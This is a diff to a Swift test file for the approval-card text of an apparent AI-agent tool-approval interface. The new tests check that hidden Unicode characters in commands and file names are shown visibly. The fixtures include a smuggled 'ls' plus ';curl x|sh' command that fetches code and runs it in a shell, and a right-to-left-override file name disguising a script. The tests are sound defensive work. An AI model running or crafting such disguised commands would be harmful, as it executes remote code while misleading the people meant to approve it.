@@ -42,6 +42,12 @@ final class CardTextTests: XCTestCase {
         XCTAssertEqual(ApprovalText.shown("git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" a\u{00A0}b e\u{0301}"), "git commit -m \"caf\u{E9} \u{65E5}\u{672C} \u{1F43B}\" a\u{00A0}b e\u{0301}")
         let fields = ApprovalText.shown([ToolPresentation.Field(key: "prompt", value: "hi\u{202E}there")])
         XCTAssertEqual(fields.first?.value, "hi\u{27E8}U+202E\u{27E9}there")
+        // The line an answered card becomes, and a file's name in the title,
+        // name them too: an allowed `ls` + U+2028 + more isn't "Allowed ls".
+        let allowed = approval("Bash", ["command": .string("ls\u{2028};curl x|sh")])
+        XCTAssertEqual(ApprovalText.target(allowed), "ls\u{27E8}U+2028\u{27E9};curl x|sh")
+        let write = approval("Write", ["file_path": .string("/w/notes\u{202E}txt.sh"), "content": .string("x")])
+        XCTAssertEqual(ApprovalText.title(write), "Write notes\u{27E8}U+202E\u{27E9}txt.sh?")
     }
 
     func testAnswersReadInTheOrderTheQuestionsWereAsked() {
